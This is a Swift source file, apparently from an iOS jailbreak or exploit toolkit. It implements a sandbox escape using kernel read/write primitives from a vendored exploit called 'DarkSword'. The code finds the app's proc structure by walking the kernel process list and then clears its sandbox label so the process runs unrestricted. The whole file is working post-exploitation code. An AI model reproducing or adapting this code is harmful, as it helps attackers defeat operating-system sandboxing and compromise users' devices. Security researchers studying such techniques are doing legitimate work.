import Foundation

public final class SandboxEscape {
    private let handle: KernelRwHandle
    private let kernelBase: UInt64
    private let procSelfAddress: UInt64

    /// Initialize sandbox escape with kernel primitives.
    /// - Parameters:
    ///   - handle: Kernel r/w handle from DarkSword exploit
    ///   - kernelBase: Base address of kernel (from XPF)
    /// - Returns: nil if our proc structure cannot be located
    public init?(handle: KernelRwHandle, kernelBase: UInt64, kernprocAddr: UInt64 = 0) {
        self.handle = handle
        self.kernelBase = kernelBase

        guard let procAddr = Self.findOurProc(kernprocAddr: kernprocAddr) else {
            LogManager.shared.append("Could not find our proc structure", tag: "SandboxEscape")
            return nil
        }
        self.procSelfAddress = procAddr
    }

    /// Find our process's proc struct in kernel memory.
    ///
    /// First tries ds_get_our_proc() from the vendored DarkSword exploit.
    /// If that fails (known issue on some kernel+chip combos where socket-based
    /// proc resolution returns 0), falls back to procbypid(getpid()) which walks
    /// the kernel's process list directly via p_list_le_next pointers.
    ///
    /// - Returns: Address of our proc struct, or nil
    private static func findOurProc(kernprocAddr: UInt64 = 0) -> UInt64? {
        guard ds_is_ready() else {
            LogManager.shared.append("DarkSword primitives not ready", tag: "SandboxEscape")
            return nil
        }
        // Try ds_get_our_proc first (fast, uses cached exploit result)
        let procAddr = ds_get_our_proc()
        if procAddr > 0 {
            LogManager.shared.append("Got proc via ds_get_our_proc at 0x\(String(procAddr, radix: 16))", tag: "SandboxEscape")
            return procAddr
        }
        LogManager.shared.append("ds_get_our_proc returned 0 — walking process list...", tag: "SandboxEscape")
        // Fallback: walk the kernel's process list starting from kernproc
        guard kernprocAddr > 0 else {
            LogManager.shared.append("No kernproc address available — cannot walk process list", tag: "SandboxEscape")
            return nil
        }
        // Read C globals into locals to satisfy Swift 6 concurrency checks.
        // off_proc_p_* are set by offsets_init() and accessed from a single
        // actor context (MainActor), so this is safe despite the warning.
        let nextOff = UInt64(get_off_proc_p_list_le_next())
        let pidOff = UInt64(get_off_proc_p_pid())
        guard nextOff != 0, pidOff != 0 else {
            LogManager.shared.append("Proc offsets not initialized", tag: "SandboxEscape")
            return nil
        }
        // Dereference kernproc to get the first proc, then walk the list
        var proc = ds_kread64(kernprocAddr)
        let targetPid = getpid()
        var checked: Int = 0
        while proc != 0 && checked < 4096 {
            let pid = ds_kread32(proc + pidOff)
            if pid == UInt32(targetPid) {
                LogManager.shared.append("Found our proc at 0x\(String(proc, radix: 16)) via proc list walk (checked \(checked) entries)", tag: "SandboxEscape")
                return proc
            }
            proc = ds_kread64(proc + nextOff)
            checked += 1
        }
        LogManager.shared.append("Our proc not found after checking \(checked) entries", tag: "SandboxEscape")
        return nil
    }

    /// Clear our process's sandbox label to become unrestricted.
    /// Delegates to the vendored C sbx_escape() which handles
    /// the kernel R/W sandbox label clearing.
    @discardableResult
    public func clearSandbox() -> Bool {
        let result = sbx_escape(procSelfAddress)
        if result == 0 {
            LogManager.shared.append("Sandbox cleared ✓", tag: "SandboxEscape")
            return true
        }
        LogManager.shared.append("sbx_escape returned \(result)", tag: "SandboxEscape")
        return false
    }
}
